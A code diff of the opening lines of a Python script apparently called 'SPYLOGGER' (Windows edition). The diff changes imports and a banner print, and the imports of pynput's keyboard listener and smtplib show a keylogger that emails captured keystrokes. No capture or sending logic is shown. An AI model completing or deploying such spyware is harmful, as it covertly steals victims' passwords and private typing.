@@ -1,19 +1,17 @@
 ############  [CODED BY :ANIRUDH] ######### [www.github.com/anii-py] ############### PEACE WITH PYTHON ###############
 # windows edition
 
-from optparse import *
 import smtplib         # To send emails
 import getpass         # To hide passwords
 try:
     from pynput.keyboard import Key,Listener
 except ModuleNotFoundError:
-    print("Module not installed please install pynput module")
+    print("Module not installed please install pynput module\n(pip install pynput)")
 
 from email.mime.multipart import MIMEMultipart        
 from email.mime.text import MIMEText                  
 from email.mime.base import MIMEBase                  
-
-use = OptionParser("""{}
+print("""
                             
     ███████╗██████╗ ██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
     ██╔════╝██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
